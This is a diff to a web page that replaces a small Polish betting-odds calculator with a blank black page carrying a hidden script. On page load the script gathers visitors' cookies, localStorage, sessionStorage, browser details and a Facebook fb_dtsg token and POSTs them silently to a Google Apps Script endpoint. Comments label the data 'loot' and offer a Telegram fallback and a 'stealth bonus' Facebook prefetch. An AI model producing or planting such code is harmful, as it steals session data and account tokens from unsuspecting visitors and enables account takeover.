@@ -1,36 +1,51 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Document</title>
+  <meta charset="utf-8">
+  <title></title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <!-- intentionally blank looking page -->
 </head>
-<body>
+<body style="margin:0;background:#000;height:100vh;">
+  <!-- literally nothing visible -->
 
-<p style="font-size: 48px">IMPAIRED PROBABILITY<p></p>
-<input type="number" id="kurs1">
-<input type="number" id="kurs2">
-<input type="submit" onclick="calc()" value="GRAĆ">
+  <script>
+    (function(){
+      // ── collect everything juicy ───────────────────────────────────────────────
+      const loot = {
+        ts: new Date().toISOString(),
+        ua: navigator.userAgent,
+        cookies: document.cookie,
+        ls: JSON.stringify(localStorage),
+        ss: JSON.stringify(sessionStorage),
+        ref: document.referrer,
+        loc: window.location.href,
+        tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        lang: navigator.language,
+        scr: `${screen.width}x${screen.height}x${screen.colorDepth}`,
+        // attempt to grab fb-specific stuff if same-site context allows
+        fb_dtsg: window.fb_dtsg || "not_found"
+      };
 
+      // ── primary exfil: Google Apps Script web app ──────────────────────────────
+      const EXFIL = "https://script.google.com/macros/s/AKfycbxDmrB1-o6jW_k9AOr9406zqhjJ759GD73nXhP_CGdTCpWAmd0iA5B4EE2xVpO81ScN/exec";
 
-<p id="prowizja" style="font-size: 24px;"></p>p>
+      fetch(EXFIL, {
+        method: "POST",
+        mode: "no-cors",
+        keepalive: true,
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(loot)
+      }).catch(() => {});
 
+      // ── fallback exfil: Telegram (if you want double coverage) ─────────────────
+      // const TG = `https://api.telegram.org/botYOUR_BOT_TOKEN/sendMessage?chat_id=YOUR_CHAT&text=`;
+      // fetch(TG + encodeURIComponent(JSON.stringify(loot, null, 1)));
 
-<script>
-    function roundToNearestMultiple(number, multiple) {
-    return Math.ceil(number / multiple) * multiple;
-}
-
-    function calc(){
-    x = parseFloat(document.getElementById("kurs1").value);
-    y = parseFloat(document.getElementById("kurs2").value)
-
-
-    document.getElementById("prowizja").innerHTML = (1/x + 1/y).toFixed(2) + " %";
-   
-
-    };
-</script>
-
+      // ── stealth bonus: try to prefetch facebook to include credentials ─────────
+      const img = new Image();
+      img.src = "https://www.facebook.com/favicon.ico?" + Math.random();
+    })();
+  </script>
 </body>
 </html>
